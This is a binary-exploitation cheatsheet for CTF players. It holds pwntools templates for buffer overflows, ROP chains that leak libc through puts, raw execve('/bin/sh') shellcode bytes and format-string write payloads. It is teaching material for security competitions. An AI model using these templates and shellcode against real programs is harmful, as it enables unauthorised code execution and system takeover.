# 💥 Pwn/Binary Exploitation CTF Cheatsheet

---

## 🔍 Initial Analysis

```bash
# Check protections
checksec binary

# File info
file binary
ldd binary        # Libraries

# Run it
./binary
ltrace ./binary   # Library calls
strace ./binary   # System calls
```

---

## 🛡️ Protections

| Protection | Description | Bypass |
|------------|-------------|--------|
| **NX** | No execute stack | ROP |
| **ASLR** | Random addresses | Leak + calculate |
| **PIE** | Random binary base | Leak binary address |
| **Canary** | Stack cookie | Leak canary |
| **RELRO** | GOT protection | Use other techniques |

---

## 📏 Buffer Overflow

### Find Offset
```bash
# Using pwntools
cyclic 200        # Generate pattern
cyclic -l 0x6161616a  # Find offset

# Using GDB
pattern create 200
pattern offset 0x6161616a
```

### Basic Exploit (pwntools)
```python
from pwn import *

p = process('./binary')
# p = remote('host', port)

offset = 64
payload = b'A' * offset
payload += p64(0xdeadbeef)  # Return address

p.sendline(payload)
p.interactive()
```

---

## 🔗 ROP (Return Oriented Programming)

### Find Gadgets
```bash
ROPgadget --binary binary
ropper -f binary

# Common gadgets
pop rdi; ret
pop rsi; pop r15; ret
ret                  # For stack alignment
```

### ROP Chain (pwntools)
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Build chain
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = b'A' * offset + rop.chain()
```

---

## 🐚 Shellcode

### 64-bit Linux
```python
# pwntools shellcraft
shellcode = asm(shellcraft.sh())

# Manual
# execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

---

## 📚 Format String

```bash
# Leak values
%p %p %p %p %p
%x %x %x %x %x

# Write
%n - write number of bytes printed
%hhn - write byte
```

```python
# pwntools fmtstr
from pwn import *
fmtstr_payload(offset, {target_addr: value})
```

---

## 🛠️ Tools

| Tool | Use |
|------|-----|
| **pwntools** | Python pwn library |
| **GDB + GEF** | Debugging |
| **ROPgadget** | Find ROP gadgets |
| **one_gadget** | Find libc one-shot |
| **checksec** | Check protections |

---

## 📋 Pwn Checklist

```markdown
□ checksec binary
□ Find vulnerability (overflow, format string)
□ Calculate offset
□ Check protections
□ Build exploit (shellcode/ROP)
□ Test locally
□ Adapt for remote
```

---

**Back to CTF:** [🏁 CTF Overview](./README.md)
